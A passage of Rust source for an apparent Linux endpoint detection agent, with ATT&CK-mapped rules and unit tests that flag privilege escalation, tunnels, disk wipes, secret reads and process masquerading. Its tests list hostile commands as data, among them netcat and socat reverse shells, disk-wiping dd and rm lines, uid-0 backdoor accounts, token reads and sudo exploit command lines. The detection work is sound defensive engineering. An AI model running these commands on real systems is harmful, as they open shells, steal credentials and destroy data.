            "T1548.001",
            if temp || interpreter { 90 } else { 65 },
            target,
            cmdline,
            serde_json::json!({ "path": target, "mode": mode }),
        ),
        target,
    ))
}

/// `setcap cap_setuid+ep /tmp/python3`: a capability that grants root.
fn capability_set(cmd: &SimpleCommand, cmdline: &str) -> Option<DetectionData> {
    const DANGEROUS: &[&str] = &[
        "cap_setuid",
        "cap_setgid",
        "cap_sys_admin",
        "cap_sys_ptrace",
        "cap_sys_module",
        "cap_dac_override",
        "cap_dac_read_search",
        "cap_chown",
        "cap_fowner",
        "all",
    ];
    if cmd.has("-r") {
        return None;
    }
    let mut pos = cmd.positional();
    let caps = pos.next()?.to_ascii_lowercase();
    let target = pos.next()?;
    let granted = DANGEROUS
        .iter()
        .find(|c| caps.split([',', '+', '=']).any(|p| p == **c))?;
    Some(with_path(
        finding(
            "privesc.capability_set",
            "Root-equivalent file capability granted",
            "privilege_escalation",
            PRIVESC,
            "T1548",
            80,
            target,
            cmdline,
            serde_json::json!({ "path": target, "capability": granted, "caps": caps }),
        ),
        target,
    ))
}

/// `chattr -i /etc/passwd` (unlock to modify) or `chattr +i` on a cron job or
/// authorized_keys (lock persistence in place).
fn chattr_tamper(cmd: &SimpleCommand, cmdline: &str) -> Option<DetectionData> {
    let attr = cmd.args.iter().find(|a| {
        (a.starts_with('-') || a.starts_with('+'))
            && (a.contains('i') || a.contains('a'))
            && a.len() <= 4
    })?;
    let target = cmd
        .args
        .iter()
        .map(String::as_str)
        .filter(|a| !a.starts_with(['-', '+', '=']))
        .find(|t| {
            system_or_temp(t) || t.starts_with("/var/log/") || t.starts_with("/var/spool/cron")
        })?;
    Some(with_path(
        finding(
            "evasion.chattr_tamper",
            "Immutable / append-only attribute changed on a protected file",
            "defense_evasion",
            EVASION,
            "T1222.002",
            55,
            target,
            cmdline,
            serde_json::json!({ "path": target, "attribute": attr }),
        ),
        target,
    ))
}

// ── Tunnels ─────────────────────────────────────────────────────────────────

/// `ssh -R`, `-D` (SOCKS), `-w` (tun device): the host becomes a pivot.
fn ssh_tunnel(cmd: &SimpleCommand, text: &str, cmdline: &str) -> Option<DetectionData> {
    let forward = cmd.args.iter().find(|a| {
        let short = a.starts_with('-') && !a.starts_with("--");
        short && (a.starts_with("-R") || a.starts_with("-D") || a.starts_with("-w"))
    })?;
    Some(finding(
        "c2.ssh_tunnel",
        "SSH remote, dynamic or tunnel-device forwarding",
        "command_and_control",
        C2,
        "T1572",
        40,
        text,
        cmdline,
        serde_json::json!({ "forward": forward }),
    ))
}

// ── Impact ──────────────────────────────────────────────────────────────────

fn is_block_device(p: &str) -> bool {
    [
        "/dev/sd",
        "/dev/nvme",
        "/dev/vd",
        "/dev/xvd",
        "/dev/hd",
        "/dev/mmcblk",
        "/dev/md",
        "/dev/dm-",
        "/dev/mapper/",
    ]
    .iter()
    .any(|d| p.starts_with(d))
}

/// `dd if=/dev/zero of=/dev/sda`, `shred /dev/nvme0n1`, `wipefs -a /dev/sdb`,
/// `rm -rf --no-preserve-root /`.
fn disk_wipe(cmd: &SimpleCommand, cmdline: &str) -> Option<DetectionData> {
    let target = match cmd.tool.as_str() {
        "dd" => {
            let src = cmd.args.iter().find_map(|a| a.strip_prefix("if="))?;
            if !matches!(src, "/dev/zero" | "/dev/urandom" | "/dev/random") {
                return None;
            }
            cmd.args
                .iter()
                .find_map(|a| a.strip_prefix("of="))
                .filter(|t| is_block_device(t))?
                .to_string()
        }
        "shred" | "blkdiscard" => cmd.positional().find(|t| is_block_device(t))?.to_string(),
        "wipefs"
            if cmd.has("-a")
                || cmd.has("--all")
                || cmd.args.iter().any(|a| a.starts_with("-a")) =>
        {
            cmd.positional().find(|t| is_block_device(t))?.to_string()
        }
        "rm" if cmd.has("--no-preserve-root") => cmd
            .positional()
            .find(|t| *t == "/" || *t == "/*")?
            .to_string(),
        _ => return None,
    };
    Some(finding(
        "impact.disk_wipe",
        "Disk or root filesystem wipe",
        "impact",
        IMPACT,
        "T1561.001",
        85,
        &target,
        cmdline,
        serde_json::json!({ "target": target }),
    ))
}

// ── Containers and secrets ──────────────────────────────────────────────────

/// `docker run --privileged -v /:/host …`: a container with the host's root
/// filesystem or namespaces is root on the host.
fn privileged_container(cmd: &SimpleCommand, text: &str, cmdline: &str) -> Option<DetectionData> {
    if !matches!(
        cmd.args.first().map(String::as_str),
        Some("run" | "create" | "exec")
    ) {
        return None;
    }
    let host_root = cmd.args.windows(2).any(|w| {
        matches!(w[0].as_str(), "-v" | "--volume" | "--mount") && {
            let v = &w[1];
            v.starts_with("/:") || v.contains("source=/,") || v.contains("src=/,")
        }
    }) || cmd
        .args
        .iter()
        .any(|a| a.starts_with("--volume=/:") || a.starts_with("-v=/:"));
    let privileged = cmd.has("--privileged");
    let host_pid = cmd.has("--pid=host")
        || cmd
            .args
            .windows(2)
            .any(|w| w[0] == "--pid" && w[1] == "host");
    if !(host_root || (privileged && host_pid)) {
        return None;
    }
    Some(finding(
        "container.privileged_launch",
        "Container started with the host root filesystem or namespaces",
        "privilege_escalation",
        PRIVESC,
        "T1611",
        70,
        text,
        cmdline,
        serde_json::json!({ "privileged": privileged, "host_root": host_root, "host_pid": host_pid }),
    ))
}

const READERS: &[&str] = &[
    "cat", "head", "tail", "less", "more", "strings", "xxd", "od", "base64", "cp", "tr", "grep",
    "awk", "sed", "curl", "nc", "ncat",
];

/// A shell tool reading a Kubernetes service-account token or another
/// process's environment (where secrets are passed).
fn secret_file_read(
    cmd: &SimpleCommand,
    text: &str,
    cmdline: &str,
    ctx: Option<&ProcContext>,
) -> Option<DetectionData> {
    if !READERS.contains(&cmd.tool.as_str()) {
        return None;
    }
    for a in &cmd.args {
        let a = a.trim_start_matches('@');
        if a.contains("/var/run/secrets/kubernetes.io/serviceaccount/token")
            || a.contains("/run/secrets/kubernetes.io/serviceaccount/token")
            || a.contains("/var/run/secrets/eks.amazonaws.com/serviceaccount/token")
        {
            return Some(with_path(
                finding(
                    "creds.k8s_token_access",
                    "Kubernetes service-account token read by a shell tool",
                    "credential_access",
                    CREDS,
                    "T1528",
                    70,
                    a,
                    cmdline,
                    serde_json::json!({ "path": a, "command": text }),
                ),
                a,
            ));
        }
        if let Some(pid) = a
            .strip_prefix("/proc/")
            .and_then(|r| r.strip_suffix("/environ"))
        {
            // `self` is the reader itself; a wildcard sweeps every process.
            let other = pid == "*"
                || (pid.chars().all(|c| c.is_ascii_digit())
                    && ctx.is_none_or(|c| pid.parse::<i32>().ok() != Some(c.pid)));
            if other {
                return Some(with_path(
                    finding(
                        "creds.proc_environ_read",
                        "Another process's environment read by a shell tool",
                        "credential_access",
                        CREDS,
                        "T1552",
                        65,
                        a,
                        cmdline,
                        serde_json::json!({ "path": a }),
                    ),
                    a,
                ));
            }
        }
    }
    None
}

// ── Exploits and masquerading ───────────────────────────────────────────────

/// Command lines that only a privilege-escalation exploit produces:
/// `sudo -u#-1` (CVE-2019-14287), `sudoedit -s '\'` (CVE-2021-3156). The raw
/// argv is checked, since the lexer would read the backslash as an escape.
fn exploit_command(pipelines: &[Vec<SimpleCommand>], cmdline: &str) -> Option<DetectionData> {
    let raw: Vec<&str> = cmdline.split_whitespace().collect();
    let sudo_uid = raw.windows(2).any(|w| {
        let uid = |v: &str| matches!(v, "#-1" | "#4294967295");
        (matches!(basename(w[0]), "sudo" | "sudoedit") || w[0].starts_with('-'))
            && (w[1].strip_prefix("-u").is_some_and(uid)
                || w[1].strip_prefix("--user=").is_some_and(uid))
    }) || raw
        .windows(2)
        .any(|w| (w[0] == "-u" || w[0] == "--user") && matches!(w[1], "#-1" | "#4294967295"));
    let sudoedit = pipelines.iter().flatten().any(|c| c.tool == "sudoedit")
        || raw.first().is_some_and(|a| basename(a) == "sudoedit");
    let baron_samedit = sudoedit
        && raw.iter().any(|a| matches!(*a, "-s" | "-i"))
        && raw.iter().skip(1).any(|a| a.ends_with('\\'));
    let cve = if sudo_uid {
        "CVE-2019-14287"
    } else if baron_samedit {
        "CVE-2021-3156"
    } else {
        return None;
    };
    Some(finding(
        "privesc.exploit_cmdline",
        "Local privilege-escalation exploit command line",
        "privilege_escalation",
        PRIVESC,
        "T1068",
        90,
        cmdline,
        cmdline,
        serde_json::json!({ "cve": cve }),
    ))
}

/// Names Linux malware borrows to blend into a process list.
const SYSTEM_NAMES: &[&str] = &[
    "sshd",
    "systemd",
    "systemd-journald",
    "crond",
    "cron",
    "init",
    "kworker",
    "kthreadd",
    "ksoftirqd",
    "kswapd0",
    "migration",
    "rcu_sched",
    "dbus-daemon",
    "rsyslogd",
    "agetty",
    "udevd",
    "systemd-udevd",
    "atd",
    "polkitd",
    "irqbalance",
    "watchdog",
    "httpd",
    "nginx",
];

fn inspect_image(comm: &str, exe: &str, cmdline: &str, out: &mut Vec<DetectionData>) {
    if exe.is_empty() {
        return;
    }
    let argv0 = cmdline.split_whitespace().next().unwrap_or("");
    // Kernel threads have no executable and no command line; a process that
    // has both and calls itself `[kworker/0:1]` is hiding.
    if argv0.starts_with('[') && cmdline.trim_end().ends_with(']') {
        out.push(with_path(
            finding(
                "evasion.masquerade_kernel_thread",
                "User process disguised as a kernel thread",
                "defense_evasion",
                EVASION,
                "T1036.004",
                90,
                exe,
                cmdline,
                serde_json::json!({ "path": exe, "argv0": argv0 }),
            ),
            exe,
        ));
        return;
    }
    let in_temp = TEMP_PREFIXES.iter().any(|p| exe.starts_with(p));
    let hidden = exe
        .split('/')
        .any(|c| c.starts_with('.') && c != "." && c != "..")
        || exe.split('/').any(|c| c.trim().is_empty() && !c.is_empty());
    let name = basename(exe);
    let borrowed = |n: &str| {
        SYSTEM_NAMES
            .iter()
            .any(|s| n == *s || (n.starts_with(s) && n[s.len()..].starts_with(['/', ':', '-'])))
    };
    if (in_temp || hidden && exe.starts_with("/dev/"))
        && (borrowed(name) || borrowed(comm) || borrowed(basename(argv0)))
    {
        out.push(with_path(
            finding(
                "evasion.masquerade_system_name",
                "Binary in a world-writable directory poses as a system daemon",
                "defense_evasion",
                EVASION,
                "T1036.005",
                85,
                exe,
                cmdline,
                serde_json::json!({ "path": exe, "comm": comm }),
            ),
            exe,
        ));
    } else if in_temp && hidden {
        out.push(with_path(
            finding(
                "evasion.hidden_exec_in_temp",
                "Binary executed from a hidden path in a temp directory",
                "defense_evasion",
                EVASION,
                "T1564.001",
                75,
                exe,
                cmdline,
                serde_json::json!({ "path": exe }),
            ),
            exe,
        ));
    }
    // PwnKit (CVE-2021-4034) runs pkexec with an empty argv.
    if name == "pkexec" && cmdline.trim().is_empty() {
        out.push(finding(
            "privesc.exploit_cmdline",
            "pkexec started without arguments (PwnKit)",
            "privilege_escalation",
            PRIVESC,
            "T1068",
            80,
            exe,
            cmdline,
            serde_json::json!({ "cve": "CVE-2021-4034" }),
        ));
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn rules(cmd: &str) -> Vec<String> {
        let exe_tool = cmd.split_whitespace().next().unwrap_or("");
        let exe = if exe_tool.starts_with('/') {
            exe_tool.to_string()
        } else {
            format!("/usr/bin/{exe_tool}")
        };
        rules_for(basename(exe_tool), &exe, cmd)
    }

    fn rules_for(comm: &str, exe: &str, cmd: &str) -> Vec<String> {
        inspect_process(comm, exe, cmd, None)
            .into_iter()
            .map(|d| d.rule_id)
            .collect()
    }

    fn has(cmd: &str, rule: &str) -> bool {
        rules(cmd).iter().any(|r| r == rule)
    }

    #[test]
    fn lexer_splits_pipelines_and_unwraps_shell_scripts() {
        let p = pipelines(
            "bash -c rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4444 >/tmp/f",
        );
        let tools: Vec<Vec<&str>> = p
            .iter()
            .map(|pl| pl.iter().map(|c| c.tool.as_str()).collect())
            .collect();
        assert_eq!(
            tools,
            vec![vec!["rm"], vec!["mkfifo"], vec!["cat", "sh", "nc"]]
        );
        assert_eq!(p[2][2].args, vec!["10.0.0.1", "4444"]);
        let s = simple_command(&lex(
            "sudo -u root env A=1 nohup timeout 5 nc -e /bin/sh h 1",
        ))
        .unwrap();
        assert_eq!(s.tool, "nc");
        assert_eq!(s.args, vec!["-e", "/bin/sh", "h", "1"]);
    }

    #[test]
    fn netcat_exec_forms() {
        for c in [
            "nc -e /bin/sh 10.0.0.1 4444",
            "ncat 10.0.0.1 4444 --exec /bin/bash",
            "ncat --sh-exec 'bash -i' 10.0.0.1 4444",
            "nc.traditional -nlvp 4444 -e /bin/bash",
            "nc -c bash 10.0.0.1 4444",
            "bash -c nc -e /bin/sh 10.0.0.1 4444",
        ] {
            assert!(has(c, "revshell.netcat_exec"), "{c}");
        }
        // LibreSSL nc `-c` is TLS; plain clients and listeners are not shells.
        for c in [
            "nc -zv 10.0.0.1 22",
            "nc -l 8080",
            "nc -c 10.0.0.1 443",
            "ncat --ssl example.com 443",
        ] {
            assert!(!has(c, "revshell.netcat_exec"), "{c}");
        }
    }

    #[test]
    fn netcat_finding_folds_with_the_wrapping_shell() {
        let shell = inspect_process(
            "bash",
            "/bin/bash",
            "bash -c nc -e /bin/sh 10.0.0.1 4444",
            None,
        );
        let tool = inspect_process("nc", "/usr/bin/nc", "nc -e /bin/sh 10.0.0.1 4444", None);
        assert_eq!(shell[0].subject, tool[0].subject);
    }

    #[test]
    fn pipe_and_fifo_relays() {
        for c in [
            "sh -c rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4444 >/tmp/f",
            "bash -c telnet 10.0.0.1 1 | /bin/bash | telnet 10.0.0.1 2",
            "sh -c mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 10.0.0.1:443 > /tmp/s",
            "bash -c mknod /tmp/p p && nc 10.0.0.1 4444 0</tmp/p | /bin/bash 1>/tmp/p",
        ] {
            assert!(has(c, "revshell.pipe_relay"), "{c}");
        }
        for c in [
            "bash -c curl -s https://example.com/x | bash",
            "bash -c ./build.sh | tee build.log",
            "bash -c echo hi | nc -q1 10.0.0.1 9000",
        ] {
            assert!(!has(c, "revshell.pipe_relay"), "{c}");
        }
    }

    #[test]
    fn socat_exec_needs_a_program_and_a_network_address() {
        assert!(has(
            "socat tcp:10.0.0.1:4444 exec:/bin/sh,pty,stderr,setsid",
            "revshell.socat_exec"
        ));
        assert!(has(
            "socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash",
            "revshell.socat_exec"
        ));
        assert!(!has(
            "socat TCP-LISTEN:8080,fork TCP:127.0.0.1:80",
            "revshell.socat_exec"
        ));
        assert!(!has(
            "socat - UNIX-CONNECT:/run/x.sock",
            "revshell.socat_exec"
        ));
    }

    #[test]
    fn disabling_security_controls() {
        for c in [
            "systemctl stop auditd",
            "systemctl disable --now falco.service",
            "systemctl mask trapd-agent",
            "service auditd stop",
            "pkill -9 osqueryd",
            "killall falcon-sensor",
            "setenforce 0",
            "aa-teardown",
        ] {
            assert!(has(c, "evasion.security_service_stopped"), "{c}");
        }
        assert!(has("auditctl -D", "evasion.audit_rules_cleared"));
        assert!(has("auditctl -e 0", "evasion.audit_rules_cleared"));
        assert!(!has("auditctl -l", "evasion.audit_rules_cleared"));
        assert!(!has("auditctl -e 1", "evasion.audit_rules_cleared"));
        for c in [
            "systemctl kill -s HUP rsyslog.service",
            "systemctl kill --signal=USR1 auditd",
            "pkill -HUP rsyslogd",
            "killall -s USR1 rsyslogd",
        ] {
            assert!(!has(c, "evasion.security_service_stopped"), "{c}");
        }
        assert!(has(
            "systemctl kill -s KILL auditd",
            "evasion.security_service_stopped"
        ));
        assert!(has(
            "pkill -SIGKILL auditd",
            "evasion.security_service_stopped"
        ));
        for c in [
            "systemctl status auditd",
            "systemctl restart trapd-agent",
            "systemctl stop nginx",
            "setenforce 1",
            "kill 1234",
        ] {
            assert!(!has(c, "evasion.security_service_stopped"), "{c}");
        }
        for c in [
            "ufw disable",
            "systemctl stop firewalld",
            "iptables -F",
            "iptables -P INPUT ACCEPT",
            "nft flush ruleset",
        ] {
            assert!(has(c, "evasion.firewall_disabled"), "{c}");
        }
        assert!(!has("ufw allow 22", "evasion.firewall_disabled"));
        assert!(!has("iptables -L -n", "evasion.firewall_disabled"));
    }

    #[test]
    fn the_agents_own_children_are_not_findings() {
        let ctx = ProcContext {
            ancestor_comms: vec!["trapd-agent".into()],
            ..Default::default()
        };
        assert!(inspect_process(
            "systemctl",
            "/usr/bin/systemctl",
            "systemctl stop trapd-agent",
            Some(&ctx)
        )
        .is_empty());
    }

    #[test]
    fn account_manipulation() {
        assert!(has(
            "useradd -o -u 0 -g 0 -M backdoor",
            "privesc.uid0_account"
        ));
        assert!(has("usermod -u 0 -o bob", "privesc.uid0_account"));
        assert!(has(
            "bash -c echo 'evil:x:0:0::/root:/bin/bash' >> /etc/passwd",
            "privesc.uid0_account"
        ));
        assert!(!has(
            "bash -c echo 'svc:x:999:999::/srv:/bin/false' >> /etc/passwd",
            "privesc.uid0_account"
        ));
        assert!(has("useradd -m alice", "persistence.account_created"));
        assert!(!has("useradd -m alice", "privesc.uid0_account"));
        assert!(has("usermod -aG sudo alice", "privesc.admin_group_added"));
        assert!(has(
            "usermod -a -G docker,video alice",
            "privesc.admin_group_added"
        ));
        assert!(has(
            "useradd -m -G wheel alice",
            "privesc.admin_group_added"
        ));
        assert!(has("gpasswd -a alice lxd", "privesc.admin_group_added"));
        assert!(!has("usermod -aG video alice", "privesc.admin_group_added"));
        assert!(!has(
            "usermod -s /bin/zsh alice",
            "privesc.admin_group_added"
        ));
    }

    #[test]
    fn timestomp_on_system_files_only() {
        assert!(has(
            "touch -r /bin/ls /usr/bin/backdoor",
            "evasion.timestomp"
        ));
        assert!(has(
            "touch -d 2019-01-01 /etc/cron.d/job",
            "evasion.timestomp"
        ));
        assert!(has(
            "touch -t 201901010000 /usr/lib/libx.so",
            "evasion.timestomp"
        ));
        assert!(!has("touch /usr/bin/x", "evasion.timestomp"));
        assert!(!has("touch -d @0 build/out.o", "evasion.timestomp"));
        assert!(!has("touch -r /etc/hosts ./copy", "evasion.timestomp"));
    }

    #[test]
    fn setuid_and_capabilities() {
        for c in [
            "chmod u+s /tmp/sh",
            "chmod 4755 /tmp/.x/bash",
            "chmod +s /home/u/bin",
            "chmod 6755 /usr/local/bin/tool",
            "chmod a+s,o-w /tmp/x",
        ] {
            assert!(has(c, "privesc.setuid_bit_set"), "{c}");
        }
        for c in [
            "chmod 755 /tmp/x",
            "chmod g+s /srv/shared",
            "chmod 2775 /srv/shared",
            "chmod u+x /tmp/x",
            "chmod -R 0644 /etc/x",
        ] {
            assert!(!has(c, "privesc.setuid_bit_set"), "{c}");
        }
        let d = inspect_process("chmod", "/usr/bin/chmod", "chmod u+s /tmp/sh", None);
        assert_eq!(d[0].confidence, 90);
        assert!(has(
            "setcap cap_setuid+ep /tmp/python3",
            "privesc.capability_set"
        ));
        assert!(has(
            "setcap cap_sys_admin,cap_net_raw=eip /opt/x",
            "privesc.capability_set"
        ));
        assert!(!has(
            "setcap cap_net_bind_service=+ep /usr/bin/node",
            "privesc.capability_set"
        ));
        assert!(!has("setcap -r /tmp/python3", "privesc.capability_set"));
    }

    #[test]
    fn chattr_on_protected_files() {
        assert!(has("chattr -i /etc/passwd", "evasion.chattr_tamper"));
        assert!(has(
            "chattr +i /root/.ssh/authorized_keys",
            "evasion.chattr_tamper"
        ));
        assert!(has("chattr +ia /etc/cron.d/x", "evasion.chattr_tamper"));
        assert!(!has("chattr +i ./notes.txt", "evasion.chattr_tamper"));
        assert!(!has("chattr +C /var/lib/mysql", "evasion.chattr_tamper"));
    }

    #[test]
    fn tunnels_and_sniffers() {
        assert!(has(
            "/tmp/chisel client 10.0.0.1:8000 R:socks",
            "c2.tunnel_tool"
        ));
        assert!(has("ngrok tcp 22", "c2.tunnel_tool"));
        assert!(has(
            "ssh -fN -R 9000:localhost:22 user@10.0.0.1",
            "c2.ssh_tunnel"
        ));
        assert!(has("ssh -D 1080 user@host", "c2.ssh_tunnel"));
        assert!(!has("ssh -L 5432:db:5432 bastion", "c2.ssh_tunnel"));
        assert!(!has("ssh user@host uptime", "c2.ssh_tunnel"));
        assert!(has(
            "tcpdump -i eth0 -w /tmp/cap.pcap",
            "creds.network_sniffing"
        ));
        assert!(!has("tcpdump -r capture.pcap", "creds.network_sniffing"));
        assert!(has("bettercap -iface eth0", "creds.mitm_tool"));
        assert!(has(
            "arpspoof -i eth0 -t 10.0.0.5 10.0.0.1",
            "creds.mitm_tool"
        ));
    }

    #[test]
    fn disk_wipes() {
        for c in [
            "dd if=/dev/zero of=/dev/sda bs=1M",
            "dd if=/dev/urandom of=/dev/nvme0n1",
            "shred -n 3 -z /dev/vda",
            "wipefs -a /dev/sdb",
            "rm -rf --no-preserve-root /",
        ] {
            assert!(has(c, "impact.disk_wipe"), "{c}");
        }
        for c in [
            "dd if=/dev/sda of=/backup/disk.img",
            "dd if=/dev/zero of=/swapfile bs=1M count=1024",
            "shred -u secrets.txt",
            "rm -rf /tmp/build",
            "wipefs /dev/sdb",
        ] {
            assert!(!has(c, "impact.disk_wipe"), "{c}");
        }
    }

    #[test]
    fn container_and_secret_access() {
        assert!(has(
            "docker run -it -v /:/host alpine chroot /host",
            "container.privileged_launch"
        ));
        assert!(has(
            "docker run --privileged --pid=host alpine nsenter -t 1 -m sh",
            "container.privileged_launch"
        ));
        assert!(!has(
            "docker run -v /srv/data:/data postgres",
            "container.privileged_launch"
        ));
        assert!(!has(
            "docker run --privileged docker:dind",
            "container.privileged_launch"
        ));
        assert!(has(
            "cat /var/run/secrets/kubernetes.io/serviceaccount/token",
            "creds.k8s_token_access"
        ));
        assert!(has(
            "sh -c curl -H \"Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\" https://kubernetes.default.svc/api",
            "creds.k8s_token_access"
        ));
        assert!(has("cat /proc/1234/environ", "creds.proc_environ_read"));
        assert!(has("strings /proc/*/environ", "creds.proc_environ_read"));
        assert!(!has("cat /proc/self/environ", "creds.proc_environ_read"));
        assert!(!has("cat /proc/1234/status", "creds.proc_environ_read"));
    }

    #[test]
    fn exploit_command_lines() {
        assert!(has("sudo -u#-1 /bin/bash", "privesc.exploit_cmdline"));
        assert!(has(
            "sudoedit -s \\\\ AAAAAAAA\\",
            "privesc.exploit_cmdline"
        ));
        assert!(!has("sudoedit /etc/hosts", "privesc.exploit_cmdline"));
        assert!(!has("sudo -u alice id", "privesc.exploit_cmdline"));
        assert_eq!(
            rules_for("pkexec", "/usr/bin/pkexec", ""),
            vec!["privesc.exploit_cmdline"]
        );
        assert!(rules_for("pkexec", "/usr/bin/pkexec", "pkexec /usr/sbin/reboot").is_empty());
    }

    #[test]
    fn masquerading() {
        assert_eq!(
            rules_for("kworker/0:1", "/tmp/.x/k", "[kworker/0:1]"),
            vec!["evasion.masquerade_kernel_thread"]
        );
        assert!(rules_for("kworker/0:1", "", "").is_empty());
        assert!(rules_for("sshd", "/tmp/sshd", "/tmp/sshd -D")
            .contains(&"evasion.masquerade_system_name".to_string()));
        assert!(rules_for("x", "/dev/shm/.k/kswapd0", "kswapd0")
            .contains(&"evasion.masquerade_system_name".to_string()));
        assert!(rules_for("sshd", "/usr/sbin/sshd", "/usr/sbin/sshd -D").is_empty());
        assert_eq!(
            rules_for("a", "/tmp/.cache/a", "/tmp/.cache/a"),
            vec!["evasion.hidden_exec_in_temp"]
        );
        assert!(rules_for("cargo", "/home/u/.cargo/bin/cargo", "cargo build").is_empty());
        assert!(rules_for("a", "/tmp/build/a", "./a").is_empty());
    }
}
